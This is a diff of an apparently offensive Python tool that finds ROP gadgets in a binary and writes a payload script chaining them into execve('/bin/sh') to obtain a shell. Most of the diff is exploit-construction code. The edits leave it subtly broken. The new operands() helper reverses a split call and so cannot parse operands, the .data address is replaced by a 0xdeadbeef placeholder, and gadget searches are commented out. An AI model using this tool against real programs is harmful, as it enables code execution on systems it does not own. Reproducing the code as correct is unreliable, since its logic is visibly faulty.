@@ -1,7 +1,6 @@
-from elftools.elf.elffile import ELFFile
-import capstone
 import struct
 import sys
+import re
 
 REGISTERS = [   "rax", "rbx", "rcx", "rdx", "rdi", "rsi", "rbp", "rsp", "r9", "r10", "r11", "r12", "r13", "r14", "r15",
                 "eax", "ebx", "ecx", "edx", "edi", "esi", "esp", "ebp", "r9d", "r10d", "r11d", "r12d", "r13d", "r14d", "r15d", 
@@ -10,9 +9,12 @@ REGISTERS = [   "rax", "rbx", "rcx", "rdx", "rdi", "rsi", "rbp", "rsp", "r9", "r
                 "ah", "bh", "ch", "dh"
             ]
 
+def operands(csinsn):
+    return ', '.split(csinsn.op_str)
+
 def LoadConstIntoReg(GadgetList, Reg, Const, fd) : 
 
-    RegList = queryGadgets(GadgetList, LOADCONSTG, Reg)
+    RegList = queryGadgets(GadgetList, Reg)
    
     # Search for "pop Reg; ret"
     x = 0
@@ -21,7 +23,7 @@ def LoadConstIntoReg(GadgetList, Reg, Const, fd) :
         gadget = RegList[x]
         inst = gadget[0]
 
-        if inst['mnemonic'] == "pop" : 
+        if inst.mnemonic == "pop" : 
 
             # "pop Reg; ret" is found
             # Steps to be taken: 
@@ -32,7 +34,7 @@ def LoadConstIntoReg(GadgetList, Reg, Const, fd) :
             
             # Write address of "pop Reg; ret"
             fd.write("payload += struct.pack('<Q', ")
-            fd.write(hex(int(inst['address'])))
+            fd.write(hex(int(inst.address)))
             fd.write(")")
             fd.write("\t\t# Address of 'pop Reg; ret'")
             fd.write("\n\t")
@@ -49,13 +51,13 @@ def LoadConstIntoReg(GadgetList, Reg, Const, fd) :
     
   
     # Search for "xor Reg, Reg; ret"
-    x = 0
-    while x < len(RegList) : 
+    # x = 0
+    # while x < len(RegList) : 
         
-        gadget = RegList[x]
-        inst = gadget[0]
+    #    gadget = RegList[x]
+    #    inst = gadget[0]
        
-        if inst['mnemonic'] == "xor" : 
+    #    if inst['mnemonic'] == "xor" : 
             # "xor Reg, Reg; ret" is found
             # Loads 0 into Reg
             # Jackpot!
@@ -64,13 +66,11 @@ def LoadConstIntoReg(GadgetList, Reg, Const, fd) :
             #   2. Call changeRegValue if Const != 0
 
             # Write it into the file
-            fd.write("payload += struct.pack('<Q', ")
-            fd.write(hex(int(inst['address'])))
-            fd.write(")")
-            fd.write("\t\t# Address of 'xor Reg, Reg; ret'")
-            fd.write("\n\t")
-            
-        x = x + 1
+    #        fd.write("payload += struct.pack('<Q', ")
+    #        fd.write(hex(int(inst['address'])))
+    #        fd.write(")")
+    #        fd.write("\t\t# Address of 'xor Reg, Reg; ret'")
+    #        fd.write("\n\t")
     
     print("Unable to find necessary gadgets to load a value into a register")
     print("Exiting...")
@@ -84,19 +84,17 @@ def getSyscallList():
         return list()
 
 # From the categorized gadgets, this routine will return a list of gadgets belonging to the queried category and containing target register.
-def queryGadgets(GadgetList, category, targetReg):
+def queryGadgets(GadgetList, targetReg):
 
-    L = GadgetList[category]
+    L = GadgetList
 
     ReturnList = list()
 
     x = 0
-    while x < len(L) : 
-        
-        gadget = L[x]
+    for gadget in L:
         inst = gadget[0]
 
-        if targetReg in inst['operands'] : 
+        if targetReg in operands(inst): 
             ReturnList.append(gadget)
         
         # Keep the loop going!
@@ -109,7 +107,7 @@ def getPopGadgets(Gadgets):
 
     for gadget in Gadgets:
         if len(gadget) == 2:
-            if gadget[-2]['mnemonic'] == 'pop':
+            if gadget[-2].mnemonic == 'pop':
                 popGadgets.append(gadget)
 
     return popGadgets
@@ -117,17 +115,19 @@ def getPopGadgets(Gadgets):
 def getMovQwordGadgets(Gadgets):
     movQwordGadgets = list()
 
-    for gadget in Gadgets:
+    for gadget in Gadgets: # TODO: Clean up this mess
         if len(gadget) >= 2:
-            if gadget[-2]['mnemonic'] == 'mov' and re.search("^qword ptr \[[a-z]+\]$",gadget[-2]['operands'][0])  and gadget[-2]['operands'][1] in REGISTERS : 
-                if(gadget[-2:] not in movQwordGadgets): # no duplicates please
-                    movQwordGadgets.append(gadget[-2:])
+            if gadget[-2].mnemonic == 'mov':
+                ops = operands(gadget[-2])
+                if re.search("^qword ptr \[[a-z]+\]$", ops[0])  and ops[1] in REGISTERS : 
+                    if(gadget[-2:] not in movQwordGadgets): # no duplicates please
+                        movQwordGadgets.append(gadget[-2:])
 
     return movQwordGadgets
 
 def canWrite(movQwordGadgets, popGadgets):
     for gadget in movQwordGadgets:
-        ops = gadget[-2]['operands']
+        ops = operands(gadget[-2])
         op1 = ops[0][-4:-1]
         op2 = ops[1]
         f1 = 0
@@ -135,12 +135,12 @@ def canWrite(movQwordGadgets, popGadgets):
         pop1 = None
         pop2 = None
         for popGadg in popGadgets:
-            if popGadg[0]['operands'][0] == op1:
+            if operands(popGadg[0])[0] == op1:
                 f1 =1
                 pop1 = popGadg
                 break
         for popGadg in popGadgets:
-            if popGadg[0]['operands'][0] == op2:
+            if operands(popGadg[0])[0] == op2:
                 f2 =1
                 pop2 = popGadg
                 break
@@ -177,7 +177,7 @@ def WriteStuffIntoMemory(GadgetList, data, addr, fd) :
 
         # Execute popGadget1 => Reg1 will have .data's address
         fd.write("payload += struct.pack('<Q', ")
-        fd.write(hex(int(popGadget1['address'])))
+        fd.write(hex(int(popGadget1.address)))
         fd.write(")")
         fd.write("\t\t# Address of pop Reg1; ret")
         fd.write("\n\t")
@@ -193,7 +193,7 @@ def WriteStuffIntoMemory(GadgetList, data, addr, fd) :
     
         # Execute popGadget2 => Reg2 will have "/bin/sh"
         fd.write("payload += struct.pack('<Q', ")
-        fd.write(hex(int(popGadget2['address'])))
+        fd.write(hex(int(popGadget2.address)))
         fd.write(")")
         fd.write("\t\t# Address of pop Reg2; ret")
         fd.write("\n\t")
@@ -207,7 +207,7 @@ def WriteStuffIntoMemory(GadgetList, data, addr, fd) :
 
         # Execute movGadget - "mov qword ptr[Reg1], Reg2", ret"
         fd.write("payload += struct.pack('<Q', ")
-        fd.write(hex(int(movGadget['address'])))
+        fd.write(hex(int(movGadget.address)))
         fd.write(")")
         fd.write("\t\t# Address of pop qword ptr [Reg1], Reg2; ret")
         fd.write("\n\t")
@@ -217,14 +217,11 @@ def checkIfSyscallPresent(GadgetList) :
     syscallList = list()
 
     x = 0
-    while x < len(GadgetList) : 
-       
-        gadget = GadgetList[0]
+    for gadget in GadgetList:
         inst = gadget[0]
-        if inst['mnemonic'] == "syscall": 
+        if inst.mnemonic == "syscall": 
             syscallList.append(gadget)
         
-        x = x + 1
     
     return syscallList
 
@@ -258,11 +255,13 @@ def execveROPChain(GadgetList):
     """ Get a section from the file, by name. Return None if no such
             section exists.
     """
-    data_section = ".data"
-    section = get_section_by_name(data_section)
+# TODO
+#    data_section = ".data"
+#    section = get_section_by_name(data_section)
     
     # We need .data section's details because we have to write "/bin//sh" into it. 
-    data_section_addr = section["sh_addr"]
+#    data_section_addr = section["sh_addr"]
+    data_section_addr = 0xdeadbeef
 
     syscallList1 = checkIfSyscallPresent(GadgetList)
     
@@ -313,7 +312,7 @@ def execve_bin_sh(GadgetList, data_section_addr) :
     else : 
         syscallGadget = syscallList[0]
         syscallDict = syscallGadget[0]
-        syscallAddress = syscallDict['address']
+        syscallAddress = syscallDict.address
     
     fd.write("payload += struct.pack('<Q', ")
     fd.write(hex(int(syscallAddress)))
@@ -325,6 +324,3 @@ def execve_bin_sh(GadgetList, data_section_addr) :
     writeFooter(fd)
     print("-->Written the complete payload in execveROPChain.py")
     print("-->Chaining successful!")
-
-execveROPChain(REGISTERS)
-
